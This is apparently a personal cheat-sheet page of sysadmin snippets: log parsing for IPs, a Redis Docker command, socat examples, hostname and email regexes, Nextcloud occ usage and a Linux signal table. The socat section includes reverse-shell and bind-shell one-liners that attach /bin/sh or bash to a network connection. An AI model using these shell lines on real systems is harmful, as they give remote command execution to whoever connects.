
* TOC
{:toc}

---

___Code___

```
# ===============================================
# § Victor-ray, S.
# § <12261439+ZendaiOwl@users.noreply.github.com>
# -----------------------------------------------
```

### IP from 'messages' log

```bash
sudo cat /var/log/messages | awk '{print $12}' | cut -d"=" -f2
```

### IP from UFW log

```bash
sudo cat /var/log/ufw.log | cut -c 47-155

sudo awk '{print $12}' /var/log/ufw.log
```

---

### Redis Docker

```bash
docker run --detach \
           --rm \
           --name redis \
           --volume redis:/data \
           --volume "$PWD"/redis.conf:/usr/local/etc/redis/redis.conf \
           --volume /var/run/redis.sock:/var/run/redis.sock \
           redis:7-alpine

docker exec -it redis redis-server /usr/local/etc/redis/redis.conf
```

---

### Socat

Listen on local port

IPv4: `sudo socat - TCP4-LISTEN:"$PORT"`

IPv6: `sudo socat - TCP6-LISTEN:"$PORT"`

Ex.

```bash
sudo socat - tcp4-listen:8080 # IPv4
sudo socat - tcp6-listen:8080 # IPv6
```

```bash
socat TCP-CONNECT:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane

socat TCP-LISTEN:$LPORT,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane

socat TCP-LISTEN:12345,reuseaddr,fork EXEC:/usr/bin/bash,pty,stderr,setsid,sigint,sane

# Listen on port 8080 to STDIO
sudo socat STDIO TCP4-LISTEN:8080

# Pass the input to a script file as argument
./test.sh "$(sudo socat - TCP-LISTEN:8080)"
```

```bash
socat TCP-LISTEN:8080,reuseaddr,fork system:'ls'
socat - TCP-LISTEN:8080,reuseaddr,fork

socat FILE:`tty`,raw,echo=0 TCP:localhost:8080
socat system:'ls -a' TCP:localhost:8080
```

```bash
# Create a local UNIX socket file
socat - UNIX-LISTEN:$FILENAME,reuseaddr,fork

# Send a message through the UNIX socket
echo 'Hello, how are you?' | socat UNIX:$FILE_NAME -
```

---

### Regex

Hostnames Regex

```regex
(?=^.{4,253}$)(^((?!-)[a-zA-Z0-9-]{1,63}(?<!-)\.)+[a-zA-Z]{2,63}$)
```

Hostname Regex TLD optional

```regex
(?=^.{1,253}$)(^(((?!-)[a-zA-Z0-9-]{1,63}(?<!-))|((?!-)[a-zA-Z0-9-]{1,63}(?<!-)\.)+[a-zA-Z]{2,63})$)
```

Email address

```regex
/^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?
(?:\.[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$/
```

Source: https://html.spec.whatwg.org/multipage/forms.html#e-mail-state-(type=email)

---

### Nextcloud OCC command

```bash
# Start command with
sudo -u www-data php /var/www/nextcloud/occ

# Show a list of all available commands
sudo -u www-data php /var/www/nextcloud/occ list
```

---

### Process signals

In Docker make sure the Entrypoint handles the process signals.

_Can be viewed with `trap -l`_

<table>
    <tr>
        <th colspan="4" rowspan="1" align="left"><i>Process signals</i></th>
    </tr>
    <tr>
        <td><strong>1.</strong> SIGHUP</td>
        <td><strong>2.</strong> SIGINT</td>
        <td><strong>3.</strong> SIGQUIT</td>
        <td><strong>4.</strong> SIGILL</td>
    </tr>
    <tr>
        <td><strong>5.</strong> SIGTRAP</td>
        <td><strong>6.</strong> SIGABRT</td>
        <td><strong>7.</strong> SIGBUS</td>
        <td><strong>8.</strong> SIGFPE</td>
    </tr>
    <tr>
        <td><strong>9.</strong> SIGKILL</td>
        <td><strong>10.</strong> SIGUSR1</td>
        <td><strong>11.</strong> SIGSEGV</td>
        <td><strong>12.</strong> SIGUSR2</td>
    </tr>
    <tr>
        <td><strong>13.</strong> SIGPIPE</td>
        <td><strong>14.</strong> SIGALRM</td>
        <td><strong>15.</strong> SIGTERM</td>
        <td><strong>16.</strong> SIGSTKFLT</td>
    </tr>
    <tr>
        <td><strong>17.</strong> SIGCHLD</td>
        <td><strong>18.</strong> SIGCONT</td>
        <td><strong>19.</strong> SIGSTOP</td>
        <td><strong>20.</strong> SIGTSTP</td>
    </tr>
    <tr>
        <td><strong>21.</strong> SIGTTIN</td>
        <td><strong>22.</strong> SIGTTOU</td>
        <td><strong>23.</strong> SIGURG</td>
        <td><strong>24.</strong> SIGXCPU</td>
    </tr>
    <tr>
        <td><strong>25.</strong> SIGXFSZ</td>
        <td><strong>26.</strong> SIGVTALRM</td>
        <td><strong>27.</strong> SIGPROF</td>
        <td><strong>28.</strong> SIGWINCH</td>
    </tr>
    <tr>
        <td><strong>29.</strong> SIGIO</td>
        <td><strong>30.</strong> SIGPWR</td>
        <td><strong>31.</strong> SIGSYS</td>
        <td><strong>34.</strong> SIGRTMIN</td>
    </tr>
    <tr>
        <td><strong>35.</strong> SIGRTMIN+1</td>
        <td><strong>36.</strong> SIGRTMIN+2</td>
        <td><strong>37.</strong> SIGRTMIN+3</td>
        <td><strong>38.</strong> SIGRTMIN+4</td>
    </tr>
    <tr>
        <td><strong>39.</strong> SIGRTMIN+5</td>
        <td><strong>40.</strong> SIGRTMIN+6</td>
        <td><strong>41.</strong> SIGRTMIN+7</td>
        <td><strong>44.</strong> SIGRTMIN+10</td>
    </tr>
    <tr>
        <td><strong>42.</strong> SIGRTMIN+8</td>
        <td><strong>43.</strong> SIGRTMIN+9</td>
        <td><strong>45.</strong> SIGRTMIN+11</td>
        <td><strong>46.</strong> SIGRTMIN+12</td>
    </tr>
    <tr>
        <td><strong>47.</strong> SIGRTMIN+13</td>
        <td><strong>48.</strong> SIGRTMIN+14</td>
        <td><strong>49.</strong> SIGRTMIN+15</td>
        <td><strong>50.</strong> SIGRTMAX-14</td>
    </tr>
    <tr>
        <td><strong>51.</strong> SIGRTMAX-13</td>
        <td><strong>52.</strong> SIGRTMAX-12</td>
        <td><strong>53.</strong> SIGRTMAX-11</td>
        <td><strong>54.</strong> SIGRTMAX-10</td>
    </tr>
    <tr>
        <td><strong>55.</strong> SIGRTMAX-9</td>
        <td><strong>56.</strong> SIGRTMAX-8</td>
        <td><strong>57.</strong> SIGRTMAX-7</td>
        <td><strong>58.</strong> SIGRTMAX-6</td>
    </tr>
    <tr>
        <td><strong>59.</strong> SIGRTMAX-5</td>
        <td><strong>60.</strong> SIGRTMAX-4</td>
        <td><strong>61.</strong> SIGRTMAX-3</td>
        <td><strong>62.</strong> SIGRTMAX-2</td>
    </tr>
    <tr>
        <td><strong>63.</strong> SIGRTMAX-1</td>
        <td><strong>64.</strong> SIGRTMAX</td>
        <td></td>
        <td></td>
    </tr>
</table>

---

<!-- START OF LINKS -->

[home]: {{ site.url }}
[bash]: {{ site.url }}/page/code/bash
[caddy]: {{ site.url }}/page/code/caddy
[git]: {{ site.url }}/page/code/git
[python]: {{ site.url }}/page/code/python

<!-- END OF LINKS -->
